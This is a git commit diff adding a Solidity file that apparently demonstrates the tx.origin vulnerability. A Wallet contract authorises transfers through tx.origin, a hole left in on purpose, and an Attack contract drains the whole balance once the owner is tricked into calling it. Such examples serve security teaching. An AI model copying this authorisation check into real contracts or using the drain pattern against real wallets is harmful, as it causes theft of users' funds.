a8783fa7d225498fa44dae81c02083016c7bcbb3
Gobinda Paul <80039050+Gobindapaull@users.noreply.github.com>
2025-03-03 16:28:56 +0530

    Update attack.sol

--- 0.8.25/tx.origin/attack.sol
+++ 0.8.25/tx.origin/attack.sol
@@ -1,1 +1,36 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
 
+contract Wallet {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function deposit() public payable {}
+
+    function transfer(address payable to, uint256 amount) public {
+        require(tx.origin == owner, "Not owner");
+        (bool sent, ) = to.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    address payable public owner;
+    Wallet wallet;
+
+    constructor(Wallet _wallet) {
+        wallet = Wallet(_wallet);
+        owner = payable(msg.sender);
+    }
+
+    function attack() public {
+        wallet.transfer(owner, address(wallet).balance);
+    }
+}
